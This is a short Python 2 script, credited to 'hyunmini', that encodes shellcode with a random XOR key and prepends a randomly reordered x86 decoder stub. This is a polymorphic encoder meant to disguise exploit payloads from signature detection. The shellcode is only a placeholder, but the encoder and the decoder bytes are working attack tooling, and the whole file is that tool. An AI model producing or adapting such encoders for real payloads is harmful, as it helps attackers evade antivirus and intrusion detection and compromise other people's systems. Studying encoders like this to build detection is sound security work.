import os,sys
import random
import struct

print " * polymorphic XOR Shellcode Encoder by hyunmini * \n"

def xor(data, key):
    leng = len(key)
    xor1 = ""
    reverse = ""
    for i in range(0, len(data)):
    	reverse += struct.pack("B", (ord(data[i]) ^ ord(key[i % leng])) )
    	if (i+1) % 4 == 0:
    		xor1 += reverse
    		reverse = ''
    return xor1

def conv_hex(data):
	hex_str = ""
	for i in range(0, len(data)):
		hex_str += ("0x%02x" % ord(data[i])).replace('0x','\\x')
	return hex_str

org_shellcode = (
	"\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43\x44\x44\x44\x44"
)

xor_shellcode = ""
xor_key = os.urandom(4)

# 1~3 random
decoder1_1 = "\xe8\xff\xff\xff\xff\xc2"  # call+4, ret (\xff\xc2 = nop)
decoder1_2 = "\x5e"						 # pop esi
decoder1 = decoder1_1+decoder1_2
decoder2 = "\x6a"+chr( (len(org_shellcode)/4)+1 )+"\x59" 	 # push length, pop ecx
decoder3 = "\xbf" + xor_key 			 # mov edi, xor_key

decoder_rand = [decoder1,decoder2,decoder3]
random.shuffle(decoder_rand)
decoder = "".join(decoder_rand)

# 4 last
getpc_offset = len(decoder)-decoder.index(decoder1)+3
decoder4_1 = "\x31\x7E"+chr(getpc_offset)		 		 # xor [esi+12], edi
decoder4_2 = "\x83\xc6\x04" 			 # add esi, 4
decoder4_3 = "\xe2\xf8" 				 # loop xor
decoder4 = decoder4_1+decoder4_2+decoder4_3

decoder += decoder4

xor_shellcode = xor(org_shellcode, xor_key)
print "Orginal : " + conv_hex(org_shellcode) + '\n'
print "Encoded : " + conv_hex(decoder)+conv_hex(xor_shellcode) + '\n'